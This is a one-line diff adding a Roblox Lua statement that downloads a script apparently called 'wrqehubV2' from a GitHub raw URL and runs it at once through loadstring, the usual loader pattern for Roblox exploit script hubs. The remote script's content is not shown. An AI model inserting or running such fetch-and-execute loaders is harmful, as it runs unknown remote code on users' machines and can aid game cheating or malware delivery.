@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jdnn1/wrqehubV2/main/wrqev2.lua", true))()
